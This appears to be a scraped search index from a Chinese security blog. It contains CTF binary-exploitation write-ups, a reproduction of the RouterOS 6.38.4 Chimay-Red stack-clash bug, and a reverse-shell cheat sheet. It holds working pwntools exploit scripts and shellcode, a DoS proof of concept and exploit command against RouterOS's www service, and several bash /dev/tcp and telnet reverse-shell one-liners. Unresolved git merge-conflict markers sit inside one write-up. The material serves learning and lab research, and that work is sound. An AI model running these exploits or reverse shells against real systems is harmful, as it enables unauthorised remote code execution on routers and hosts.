u32(p.recvuntil(\u0026#39;\\xf7\u0026#39;)[-4:])\r#write_addr = u32(p.recv(4))\rprint(\u0026#39;write_addr =\u0026#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：\n可以看到，函数的后12位是460。\n然后修改一下上面的脚本，我们可以输出一些其他的函数：\n我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/\n这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：\nlibcbase = write_addr - 0xd44d0\rsystem = libcbase + 0x3a950\rbinsh = libcbase + 0x15912b\rpayload = 112 * b\u0026#39;a\u0026#39;\rpayload += p32(system)\rpayload += p32(0xdeadbeef)\rpayload += p32(binsh)\rsh.","title":"ret2resolve1"},{"content":"首先查看基本情况：\nida中也没有看到system和/bin/sh\n可以看到栈可执行，我们需要判断是jmp rsp还是输入shellcode：\n在IDA中我们可以看到read函数可以输入0x40个字符，但buf却只存取8个字符，所以我们有0x38个字符可以输入，这个长度我们可以使用shellcode\nshellcode = \u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; 又因为程序开启了PIE，我们需要计算shellcode的地址：\np.recvuntil(\u0026#39;[\u0026#39;) buf_addr = p.recvuntil(\u0026#39;]\u0026#39;,drop=True) 这样就可以计算出存放字符的起始地址\n然后构造payload：\npayload = flat([\u0026#39;a\u0026#39;*16,p64(int(buf_addr,16)+8+8+8),shellcode])\r//‘a’*16：填充字符\r\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD\r//p64(int(buf_addr,16)+8+8+8)：buf_addr的起始地址+read函数读取的8位+rbp的填充+shellcode的8位地址\r=======\r//p64(int(buf_addr,16)+8+8+8)：buf_addr的起始地址+read函数读取的8位+leave使用掉的8位+shellcode的8位地址\r//leave = mov esp,ebp;pop ebp\r\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; origin/dev #ret2shellcode_x64\rfrom pwn import *\r#p = process(\u0026#34;./ret2shellcode\u0026#34;)\rp = remote(\u0026#34;10.0.25.109\u0026#34;,10000)\rshellcode = \u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39;\rp.recvuntil(\u0026#39;:\u0026#39;)\rbuf_addr = p.recvuntil(\u0026#39;\\n\u0026#39;,drop=True)\rpayload = flat([\u0026#39;a\u0026#39;*16,p64(int(buf_addr,16)+8+8+8),shellcode])\rp.sendline(payload)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2shellcode/","summary":"首先查看基本情况：\nida中也没有看到system和/bin/sh\n可以看到栈可执行，我们需要判断是jmp rsp还是输入shellcode：\n在IDA中我们可以看到read函数可以输入0x40个字符，但buf却只存取8个字符，所以我们有0x38个字符可以输入，这个长度我们可以使用shellcode\nshellcode = \u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; 又因为程序开启了PIE，我们需要计算shellcode的地址：\np.recvuntil(\u0026#39;[\u0026#39;) buf_addr = p.recvuntil(\u0026#39;]\u0026#39;,drop=True) 这样就可以计算出存放字符的起始地址\n然后构造payload：\npayload = flat([\u0026#39;a\u0026#39;*16,p64(int(buf_addr,16)+8+8+8),shellcode])\r//‘a’*16：填充字符\r\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD\r//p64(int(buf_addr,16)+8+8+8)：buf_addr的起始地址+read函数读取的8位+rbp的填充+shellcode的8位地址\r=======\r//p64(int(buf_addr,16)+8+8+8)：buf_addr的起始地址+read函数读取的8位+leave使用掉的8位+shellcode的8位地址\r//leave = mov esp,ebp;pop ebp\r\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; origin/dev #ret2shellcode_x64\rfrom pwn import *\r#p = process(\u0026#34;./ret2shellcode\u0026#34;)\rp = remote(\u0026#34;10.0.25.109\u0026#34;,10000)\rshellcode = \u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39;\rp.recvuntil(\u0026#39;:\u0026#39;)\rbuf_addr = p.recvuntil(\u0026#39;\\n\u0026#39;,drop=True)\rpayload = flat([\u0026#39;a\u0026#39;*16,p64(int(buf_addr,16)+8+8+8),shellcode])\rp.sendline(payload)\rp.interactive() ","title":"ret2shellcode"},{"content":"注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。 首先先检查一下保护机制：\n可以看到，没有开启栈溢出保护和随机地址。\n那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：\n这个文件是开启了静态编译的。\n文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。\n我们使用IDA，就可以直观的感受到：\n我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。\n然后我们查看是否有/bin/sh字符：\n通过查找，可以看到在程序中确实有/bin/sh字符串。\n虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便 可以看到我们想要的gadget都有\n这道题的思路就是：\n通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。\n#payload.py\rfrom pwn import *\r#p=process(\u0026#34;./ret2syscall\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10004)\rif args.G:\rgdb.attach(p)\rpop_eax_ret = 0x4005af\rpop_rdi_ret = 0x4006a6\rpop_rsi_ret = 0x4100f3\rpop_rdx_ret = 0x448ee5\rbin_addr = 0x492364\rsyscall = 0x40126c\rpayload = flat([\u0026#39;a\u0026#39;*120,pop_eax_ret,\u0026#39;\\x00\u0026#39;*4,0x3b,\u0026#39;\\x00\u0026#39;*4,\rpop_rdi_ret,\u0026#39;\\x00\u0026#39;*4,bin_addr,\u0026#39;\\x00\u0026#39;*4,pop_rsi_ret,\r\u0026#39;\\x00\u0026#39;*12,pop_rdx_ret,\u0026#39;\\x00\u0026#39;*12,syscall])\r#payload = b\u0026#39;a\u0026#39;*120 + p64(pop_eax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_addr)\r#payload += p(pop_rsi_ret) + \u0026#39;\\x00\u0026#39;*8 + p64(pop_rdx_ret) + \u0026#39;\\x00\u0026#39;*8 + p64(syscall)\rp.sendline(payload)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2syscall/","summary":"注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。 首先先检查一下保护机制：\n可以看到，没有开启栈溢出保护和随机地址。\n那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：\n这个文件是开启了静态编译的。\n文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。\n我们使用IDA，就可以直观的感受到：\n我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。\n然后我们查看是否有/bin/sh字符：\n通过查找，可以看到在程序中确实有/bin/sh字符串。\n虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便 可以看到我们想要的gadget都有\n这道题的思路就是：\n通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。\n#payload.py\rfrom pwn import *\r#p=process(\u0026#34;./ret2syscall\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10004)\rif args.G:\rgdb.attach(p)\rpop_eax_ret = 0x4005af\rpop_rdi_ret = 0x4006a6\rpop_rsi_ret = 0x4100f3\rpop_rdx_ret = 0x448ee5\rbin_addr = 0x492364\rsyscall = 0x40126c\rpayload = flat([\u0026#39;a\u0026#39;*120,pop_eax_ret,\u0026#39;\\x00\u0026#39;*4,0x3b,\u0026#39;\\x00\u0026#39;*4,\rpop_rdi_ret,\u0026#39;\\x00\u0026#39;*4,bin_addr,\u0026#39;\\x00\u0026#39;*4,pop_rsi_ret,\r\u0026#39;\\x00\u0026#39;*12,pop_rdx_ret,\u0026#39;\\x00\u0026#39;*12,syscall])\r#payload = b\u0026#39;a\u0026#39;*120 + p64(pop_eax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_addr)\r#payload += p(pop_rsi_ret) + \u0026#39;\\x00\u0026#39;*8 + p64(pop_rdx_ret) + \u0026#39;\\x00\u0026#39;*8 + p64(syscall)\rp.","title":"ret2syscall"},{"content":"拿到binary后首先查看基本信息：\n发现是64位文件，然后使用checksec指令来查看程序的保护情况\n发现这道题并没有栈保护和PIE，因为没有PIE，所以.text上的代码地址是固定的，在我们调用函数和构造gadget时就可以直接使用.text上的地址。\n然后我们将binary放入IDA中：\n我们可以清楚看到main函数，随后我们来到main函数可以看到其中有两个功能函数：\n（两个功能函数已被我在IDA中重命名，目的是为了直观展示两个函数的作用）\n随后我们跟如两个函数内部：\n可以看到两个函数的功能，尤其是int hello ()函数中存在gets()函数，可以成为突破点。\n可以看到v1字符串的大小为0x70字节，但是gets函数会读取用户输入直到遇到\u0026rsquo;\\n\u0026rsquo;字符，能读取的字符串长度大于0x70字节，这将导致缓冲区溢出，由于变量v1储存在栈上，所以将导致栈溢出。\n于是我们利用Linux自带的cyclic命令构建200个有序字符，因为是有序的字符串，所以我们可以通过任意四个字符来定位这四个字符在这字符串中的位置，从而计算出这四个字符前面有多少个字符：\n然后在gdb中运行ret2text，使用r指令，gdb会在输入字符处停下来，等待输入。\n我们输入刚刚的200个有序字符，回车后我们可以看到程序到了一个无法识别的地方：\n这就证明，我们输入的字符串过多，get函数发生了溢出，多余的字符覆盖了原本的ret的值，导致ret将我们输入的参数当作返回地址了，于是我们使用cyclic自带的-l命令来计算输入了多少个字符：\n这样我们就知道了，我们需要输入120个字符才能覆盖到ret。\n上面因为我们输入的长度覆盖到了ret，导致ret返回到了奇怪的地方。既然ret可以返回到奇怪的地方，那就意味着ret可以返回到能够受我们控制的地方。\n在IDA中我们可以看到这样一个函数：\n这个函数调用了system函数并且参数是/bin/sh。\n如果我们可以让上面说到的ret返回到这个函数上，那么我们就能运行这个函数。运行了system(/bin/sh)我们就能能进入linux shell。\n所以我们构造payload，首先是使得gets溢出到ret的padding（填充），再在padding后面跟上这个函数的地址0x4006c7\n那么最后我们的payload就是：\nPayload=b”a”*120+p(0x4006C7) #ret2text.py\rfrom pwn import *\rp=remote(\u0026#34;10.0.25.109\u0026#34;,10001) p.recvuntil(\u0026#34;?\\n\u0026#34;) p.sendline(b\u0026#34;a\u0026#34;*120+p32(0x4006C7)) p.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2text/","summary":"拿到binary后首先查看基本信息：\n发现是64位文件，然后使用checksec指令来查看程序的保护情况\n发现这道题并没有栈保护和PIE，因为没有PIE，所以.text上的代码地址是固定的，在我们调用函数和构造gadget时就可以直接使用.text上的地址。\n然后我们将binary放入IDA中：\n我们可以清楚看到main函数，随后我们来到main函数可以看到其中有两个功能函数：\n（两个功能函数已被我在IDA中重命名，目的是为了直观展示两个函数的作用）\n随后我们跟如两个函数内部：\n可以看到两个函数的功能，尤其是int hello ()函数中存在gets()函数，可以成为突破点。\n可以看到v1字符串的大小为0x70字节，但是gets函数会读取用户输入直到遇到\u0026rsquo;\\n\u0026rsquo;字符，能读取的字符串长度大于0x70字节，这将导致缓冲区溢出，由于变量v1储存在栈上，所以将导致栈溢出。\n于是我们利用Linux自带的cyclic命令构建200个有序字符，因为是有序的字符串，所以我们可以通过任意四个字符来定位这四个字符在这字符串中的位置，从而计算出这四个字符前面有多少个字符：\n然后在gdb中运行ret2text，使用r指令，gdb会在输入字符处停下来，等待输入。\n我们输入刚刚的200个有序字符，回车后我们可以看到程序到了一个无法识别的地方：\n这就证明，我们输入的字符串过多，get函数发生了溢出，多余的字符覆盖了原本的ret的值，导致ret将我们输入的参数当作返回地址了，于是我们使用cyclic自带的-l命令来计算输入了多少个字符：\n这样我们就知道了，我们需要输入120个字符才能覆盖到ret。\n上面因为我们输入的长度覆盖到了ret，导致ret返回到了奇怪的地方。既然ret可以返回到奇怪的地方，那就意味着ret可以返回到能够受我们控制的地方。\n在IDA中我们可以看到这样一个函数：\n这个函数调用了system函数并且参数是/bin/sh。\n如果我们可以让上面说到的ret返回到这个函数上，那么我们就能运行这个函数。运行了system(/bin/sh)我们就能能进入linux shell。\n所以我们构造payload，首先是使得gets溢出到ret的padding（填充），再在padding后面跟上这个函数的地址0x4006c7\n那么最后我们的payload就是：\nPayload=b”a”*120+p(0x4006C7) #ret2text.py\rfrom pwn import *\rp=remote(\u0026#34;10.0.25.109\u0026#34;,10001) p.recvuntil(\u0026#34;?\\n\u0026#34;) p.sendline(b\u0026#34;a\u0026#34;*120+p32(0x4006C7)) p.interactive() ","title":"ret2text"},{"content":"rinetd是一个在linux上的端口转发工具。\n安装方式 在github上搜索rinetd就可以找到官方仓库\n安装命令在README里也有写：\n./bootstrap\r./configure –prefix=/home/shangdi4sb/rinetd #home目录下\rmake\rmake install 需要注意的是 configure时填写安装目录，我个人是习惯安装在home目录下\n配置文件 配置文件的位置为：\u0026lt;安装目录\u0026gt;/etc/rinetd.conf\n我们直接打开文件，按照如下格式写入内容就可以了，不需要理会配置文件原有的内容：\nbindadress bindport connectaddress connectport\r监听的ip 监听ip的端口 转发的ip 转发ip的端口 例如我想把本地8080端口的数据转发到qemu(192.168.113.129)的80端口上\n0.0.0.0 8080 192.168.113.129 80 启动rinetd rinetd的二进制文件存默认放在：\u0026lt;安装目录\u0026gt;/etc/rinetd.conf\n使用如下命令：\n./sbin/rinetd -f -c ./etc/rinetd.conf -f 不使用后台模式，一般使用这个参数是为了看报错\n-c 指定配置文件\n","permalink":"https://jellyfish-pro.github.io/note/rinetd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","summary":"rinetd是一个在linux上的端口转发工具。\n安装方式 在github上搜索rinetd就可以找到官方仓库\n安装命令在README里也有写：\n./bootstrap\r./configure –prefix=/home/shangdi4sb/rinetd #home目录下\rmake\rmake install 需要注意的是 configure时填写安装目录，我个人是习惯安装在home目录下\n配置文件 配置文件的位置为：\u0026lt;安装目录\u0026gt;/etc/rinetd.conf\n我们直接打开文件，按照如下格式写入内容就可以了，不需要理会配置文件原有的内容：\nbindadress bindport connectaddress connectport\r监听的ip 监听ip的端口 转发的ip 转发ip的端口 例如我想把本地8080端口的数据转发到qemu(192.168.113.129)的80端口上\n0.0.0.0 8080 192.168.113.129 80 启动rinetd rinetd的二进制文件存默认放在：\u0026lt;安装目录\u0026gt;/etc/rinetd.conf\n使用如下命令：\n./sbin/rinetd -f -c ./etc/rinetd.conf -f 不使用后台模式，一般使用这个参数是为了看报错\n-c 指定配置文件","title":"rinetd端口转发"},{"content":"RouterOS软路由线程同步漏洞 漏洞简介 该漏洞存在于RouterOS 6.38.4及以下版本。漏洞原理为未对 alloca()函数分配内存的大小做限制，导致alloca()函数可分配超过本线程内存块大小的内存，从而非法访问其他线程的内存。\n漏洞复现 RouterOS环境搭建 因为该漏洞为软路由漏洞，且有x86架构，故我们可使用VMware直接模拟。\n首先我们需要先下载Routeros的镜像，或者直接去官网下载镜像\n这里我选择的是 RouterOS 6.38.4\n然后使用VMware模拟，这里我们指出几个需要注意的点：\n这里可以选择Linux 3.x 内核。\n随后创建完成虚拟机后，需要修改虚拟机配置：\n这里需要将 硬盘(SCSI)改为IDE\n随后启动RouterOS虚拟机，一般说来，第一次开机会选择需要安装的服务这里我们直接输入'a'选择所有，然后输入'i'进行安装，然后根据提示一直按 'y'就可以：\n安装好后使用 admin：''登录RouterOS。\n然后输入setup命令，根据提示设置ip地址\n最后打开浏览器，访问刚刚设定的IP地址，如能访问，则证明安装完成。\nRouterOS越狱 因为RouterOS原生操作系统是基于Linux系统复写的一套新操作系统。原生的RouterOS甚至连busybox都没有，更别说后面的调试了。所以我们需要对其进行越狱处理。\n这里我们使用的是 mikrotik-tools工具，该工具可以帮助我们进入RouterOS的Linux系统。\n使用方法也很简单：\n#git clone https://github.com/0ki/mikrotik-tools.git\r#cd mikrotik-tools\r#./exploit-backup/exploit_full.sh 随后按照提示输入对应信息就可以。\n**注：**因为该方法使用的ssh远程连接RouterOS，所以一些太过古老的版本会提示ssh找不到对应的加密方式。\n出现截图中的语句则表示越狱成功。\n接下来我们就可以使用telnet连接RouterOS了。(用户密码为 devel:'')\nRouterOS漏洞复现 这里我们使用Chimay-Red项目中的exp.\n**注：**该exp需要python2版本的pwntools模块。(直接改成符合python3的语法就行，只需要修改几个字符类型就行。别去安装python2的pwntools环境，浪费时间。别问我怎么知道的)\n首先我们先获取当前RouterOS版本中存在漏洞的二进制文件：\n#./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_6384_x86 随后使用nc监听端口：\n#nc -lnvp 8080 然后使用exp，执行命令：\n#./StackClash_x86.py 192.168.113.129 80 www_binary \u0026#34;mknod /ram/f p; /bin/telnet 192.168.113.128 8080 \u0026lt; /ram/f | /bin/bash \u0026gt;/ram/f 2\u0026gt;\u0026amp;1\u0026#34; 漏洞代码分析 在上面的exp利用中，我们看到了，漏洞点是在 /nova/bin/www 中的 alloca函数，因此我们将刚刚拿到的二进制文件，放入IDA。\n在 Request::readPostData函数里，我们可以看到漏洞点：\n通过伪代码和函数的名称，我们可以大概了解到这是一个处理post请求的函数，大概的流程为，处理请求头的 content-length字段，然后使用 alloca函数分配内存，随后利用read函数将post请求的数据读入分配好的内存中。\n粗略的看上去，这段代码似乎并没有问题，但是当我们将请求头的 content-length字段设置为一个十分大的数时，就可以看到该漏洞的效果。(-1非常大)(大嘘)\n#poc.py\rimport socket\rdef makeHeader(num):\rstring = f\u0026#34;POST /jsproxy HTTP/1.1\\r\\nContent-Length: {num}\\r\\n\\r\\n\u0026#34;\rreturn string.encode()\rhead = makeHeader(-1)\rs1 = socket.socket()\rs1.connect((\u0026#34;192.168.113.129\u0026#34;, 80))\rs1.send(head)\rs1.send(b\u0026#39;A\u0026#39;*0x10)\rs1.close() 我们把断点打在alloca()前：\n（这里只是用ida表示断点打在那，调试还是用的gdb）\n通过这里的汇编我们可以看到alloca函数并没有使用call指令，而是直接使用的sub esp,eax命令，来实现分配栈的操作。\n我们将poc发送过去，gdb断在了断点处，我们一步步往下走\n0x8055a53：将我们传过去的数字放入edx， 0x8055a56：edx+0x10，放入eax。因为edx已经为最大数了，故edx+0x10=0xf。 0x8055a59：这里的命令的意思相当于是将eax的最低位数变为0。 0x8055a5c：这里就是漏洞点了，这里将esp减去eax，可是eax为0.故esp不变。 到这里漏洞已经触发了，只是我们看不到任何的效果。我们需要将程序运行到下面的read函数，才可以看到明显的效果：\n通过栈，我们可以看到read函数的参数。参数显示read函数会读取0xffffffff个字节到0x774cb180（就是上面esp所指的地址）。\n这下漏洞就很明显了，我们要读取0xfffffff个字节，但是alloca函数并没有分配栈来读取这0xfffffff个字节（也可以说是分配了0个字节的栈），这时read函数并不知道alloca函数没有分配栈，故把所有字节都写入了0x774cb180处，于是程序原本的栈结构就被破坏了。显示Segmentation fault\n**注：**这里需要额外注意，根据x86传参规律，我们可以判断地址0x774cb17c上面的为参数。那么read的返回值则会放到0x774cb16c的位置。换言之就是read函数返回值会被放在（写入地址-0x14）的位置。这里很重要，因为下面漏洞利用时会涉及到ret偏移量的计算。\n漏洞利用 从上面使用的exp，我们可以大概猜到利用方式是使用的线程同步。\n通过观察exp和调试，利用方法大概为：\n第一步：创建两个线程，t1，t2。\n第二步：利用alloca函数将t1的栈顶抬至t2的栈里\n第三步：触发t2中的read函数，让其将ret放入栈中\n第四步：触发t1的read函数，读取数据，覆盖t2的ret\n第五步：关闭t2，触发read函数ret，实现程序流控制\n前提准备 因为我们需要将第一个线程的数据写进第二个线程，所以我们要保证两个线程的内存是挨在一起的，那么要怎么样才能做到这一点呢？很简单的办法就是重新创建一个新的进程，在新的进程中创建两个线程。\n由于ROS有着服务自动重启的机制，所以我们可以使用上面所说的传给alloca函数一个很大的数字，从而让当前的www服务崩溃，随后ROS重启www服务，这时在这个全新的www中创建两个线程，那么两个线程的内存块就连在一起了：\n我们执行上面的exp，然受使用IDA远程调试：\n**注：**需要先将gdbserver放入ROS，可以通过wget命令，也可以在浏览器上访问路由管理页面直接上传文件。这里选择IDA调试而不选择GDB的原因是对于多进程调试，IDA比GDB更方便一些\n然后使用IDA连接（记得先打上断点）：\n随后发送exp，看到到达断点位置：\n看到这里只新建了一个线程，这个线程就是要被我们弄崩溃的那个线程。我们继续单步往下：\n步过read函数后可以看到两个新的线程被创建，我们去看看这两个线程的栈顶：\n，然后我们去看看堆栈情况：\n两个线程分别位于这两个内存块中（0x77d36000-0x77d55000和0x77d16000-0x77d35000），中间有一块0x1000的缓冲带 ，那么很明显，两个线程的内存挨在一起了。\n第一步 第一步是创建两个线程，其实上面我们也体现了，杀掉第一个线程，创建两个新线程，所以这里我们就不调试了，直接分析exp的代码：\n首先程序先将原本的进程弄崩溃：\ndef crash(ip, port):\rprint(\u0026#34;Crash...\u0026#34;)\rs = makeSocket(ip, port)\rsocketSend(s, makeHeader(-1))#发送-1，\rsocketSend(s, b\u0026#39;A\u0026#39; * 0x1000)\rs.close()\rtime.sleep(2.5) # www takes up to 3 seconds to restart 然后，创建两个socket，从exp的角度看是创建两个socket，但从ROS的角度看则是创建了两个线程：\ndef makeSocket(ip, port):\rs = socket.socket()\rtry:\rs.connect((ip, port))\rexcept:\rprint(\u0026#34;Error connecting to socket\u0026#34;)\rsys.exit(-1)\rprint(\u0026#34;Connected\u0026#34;)\rtime.sleep(0.5)\rreturn s\rs1 = makeSocket(ip, port) # socket 1, thread A\rs2 = makeSocket(ip, port) # socket 2, thread B 第二步 **注：**第二步是最为复杂的一步，因为我们需要计算t2的read函数的ret偏移量。这里截图中的地址和上面的截图可能不同，但步骤是连贯的\n第二步将t1的栈抬至t2中，将t1的栈抬至t2很简单，但是要抬多高呢，抬到什么程度呢。\n让我们来分析一下，我们将t1抬至t2的目的是为了覆盖t2的read函数的返回值，那么久意味着我们至少要抬0x20000个字节，因为t1和t2栈的差值就是0x20000。随后还有0x1000的保护区，故至少要抬0x21000个字节。随后我们再给0x8000字节大小留给ROP链。故最后的值位0x29000。\n现在我们知道t1的栈需要抬0x29000个字节，那么为了保证我们的ROP链可以正好覆盖到t2的read函数返回值，那么我们应该将t2的栈抬多高呢？\n上面说到，我们将t1抬至t2，抬了0x29000个字节。但是我们可以计算出t1和t2的栈差值是0x20000，所以其实我们还有0x9000个字节可以拿来让t2抬栈。那么抬多少呢？这里exp上面写的是让t2抬0x8000个字节，这里抬0x8000并不是一个固定的数值，事实上t2抬的栈只要大于发送过去的ROP链的大小，就可行。这里我还是选择跟随exp抬0x8000个字节，因为如果更换了大小，后面的ret偏移量就要重新计算。\n抬栈之后我们就可以看到，两个线程的栈顶就只剩下了0x1000字节：\n根据上面的介绍，我们知道要覆盖的是t2的read函数的ret值，故t1的栈高于t2的栈。那么这时候t2的read函数的ret值，会放在哪个地方呢？\n在漏洞代码分析的最后，我们提到了ret会放在哪个位置，那么在这里，ret的位置则会在（t2刚抬栈时的栈顶-0x14)的位置，也就是0x77D2C15C\n现在知道了ret的地址，那么这个地址就是我们ROP的起始位置，可是这个地址距离t1的写入字符串地址还有一定的距离。对于这段距离，我们就使用无意义的字符进行填充就好了，具体的填充个数为：0x77D2C15C-0x77D2B170=0xFEC\n第三步 触发t2的read函数，将其ret放入栈中，这里其实只需要我们将t2挂着等待（保持socket2连接不中断）就行，因为read函数存在阻塞，只要连接不中断，read函数就不会结束。\n**注：**s2只用发送包头，不要发送数据，否则容易把s1发送的ROP给覆盖掉。\n第四步 首先s1发送padding，因为read函数的阻塞，所以t1会读取padding，但不会退出。这时t2已经进入read函数被阻塞住了，故再次让s1发送ROP，即可覆盖t2的read函数的返回值。\n覆盖前：\n覆盖后：\n**注：**图片中的地址和计算偏移的截图中的地址不一样，原因是因为上面截图花费了大量的时间导致socket中的字符串失效，故read函数无法写入字符串。\n第五步 关闭s2的连接，刚刚t2被read函数阻塞住了，我们这边关闭s2的连接，让read函数继续运行，当read函数运行结束时，就会返回我们ROP所指向的地址。\nROP解析 上面说到了怎么覆盖掉t2的read函数的ret。覆盖掉ret后，就是如何构造ROP了。通过观察exp，我们可以看到其实exp也是选择了非常实用的使用strncpy函数，将所需要的字符串都复制到一个我们能控制的位置，随后调用dlsym函数，寻找system函数的地址，最后再将cmd的地址放入system函数\n","permalink":"https://jellyfish-pro.github.io/posts/routeros%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E/","summary":"RouterOS软路由线程同步漏洞 漏洞简介 该漏洞存在于RouterOS 6.38.4及以下版本。漏洞原理为未对 alloca()函数分配内存的大小做限制，导致alloca()函数可分配超过本线程内存块大小的内存，从而非法访问其他线程的内存。\n漏洞复现 RouterOS环境搭建 因为该漏洞为软路由漏洞，且有x86架构，故我们可使用VMware直接模拟。\n首先我们需要先下载Routeros的镜像，或者直接去官网下载镜像\n这里我选择的是 RouterOS 6.38.4\n然后使用VMware模拟，这里我们指出几个需要注意的点：\n这里可以选择Linux 3.x 内核。\n随后创建完成虚拟机后，需要修改虚拟机配置：\n这里需要将 硬盘(SCSI)改为IDE\n随后启动RouterOS虚拟机，一般说来，第一次开机会选择需要安装的服务这里我们直接输入'a'选择所有，然后输入'i'进行安装，然后根据提示一直按 'y'就可以：\n安装好后使用 admin：''登录RouterOS。\n然后输入setup命令，根据提示设置ip地址\n最后打开浏览器，访问刚刚设定的IP地址，如能访问，则证明安装完成。\nRouterOS越狱 因为RouterOS原生操作系统是基于Linux系统复写的一套新操作系统。原生的RouterOS甚至连busybox都没有，更别说后面的调试了。所以我们需要对其进行越狱处理。\n这里我们使用的是 mikrotik-tools工具，该工具可以帮助我们进入RouterOS的Linux系统。\n使用方法也很简单：\n#git clone https://github.com/0ki/mikrotik-tools.git\r#cd mikrotik-tools\r#./exploit-backup/exploit_full.sh 随后按照提示输入对应信息就可以。\n**注：**因为该方法使用的ssh远程连接RouterOS，所以一些太过古老的版本会提示ssh找不到对应的加密方式。\n出现截图中的语句则表示越狱成功。\n接下来我们就可以使用telnet连接RouterOS了。(用户密码为 devel:'')\nRouterOS漏洞复现 这里我们使用Chimay-Red项目中的exp.\n**注：**该exp需要python2版本的pwntools模块。(直接改成符合python3的语法就行，只需要修改几个字符类型就行。别去安装python2的pwntools环境，浪费时间。别问我怎么知道的)\n首先我们先获取当前RouterOS版本中存在漏洞的二进制文件：\n#./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_6384_x86 随后使用nc监听端口：\n#nc -lnvp 8080 然后使用exp，执行命令：\n#./StackClash_x86.py 192.168.113.129 80 www_binary \u0026#34;mknod /ram/f p; /bin/telnet 192.168.113.128 8080 \u0026lt; /ram/f | /bin/bash \u0026gt;/ram/f 2\u0026gt;\u0026amp;1\u0026#34; 漏洞代码分析 在上面的exp利用中，我们看到了，漏洞点是在 /nova/bin/www 中的 alloca函数，因此我们将刚刚拿到的二进制文件，放入IDA。","title":"RouterOS软路由线程同步漏洞"},{"content":"一般选择反弹shell 攻击机：\nnc -lnvp 8080 目标机：\nbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.113.128/8080 0\u0026gt;\u0026amp;1\r或\rbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.113.128/8080 0\u0026gt;\u0026amp;1\u0026#34; 或者\nmknod /ram/f p; /bin/telnet 192.168.113.128 8080 \u0026lt; /ram/f | /bin/bash \u0026gt;/ram/f 2\u0026gt;\u0026amp;1 mknod：创建名为 /ram/f的管道\n若在脚本中使用：\nrm /tmp/f;mknod /tmp/f p;/bin/telnet 192.168.1.3 8080 \u0026lt; /tmp/f |/bin/bash \u0026gt;/tmp/f 2\u0026gt;/tmp/f ","permalink":"https://jellyfish-pro.github.io/note/shell/","summary":"一般选择反弹shell 攻击机：\nnc -lnvp 8080 目标机：\nbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.113.128/8080 0\u0026gt;\u0026amp;1\r或\rbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.113.128/8080 0\u0026gt;\u0026amp;1\u0026#34; 或者\nmknod /ram/f p; /bin/telnet 192.168.113.128 8080 \u0026lt; /ram/f | /bin/bash \u0026gt;/ram/f 2\u0026gt;\u0026amp;1 mknod：创建名为 /ram/f的管道\n若在脚本中使用：\nrm /tmp/f;mknod /tmp/f p;/bin/telnet 192.168.1.3 8080 \u0026lt; /tmp/f |/bin/bash \u0026gt;/tmp/f 2\u0026gt;/tmp/f ","title":"shell"},{"content":"注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。 查看基本信息：\n这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：\n有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp 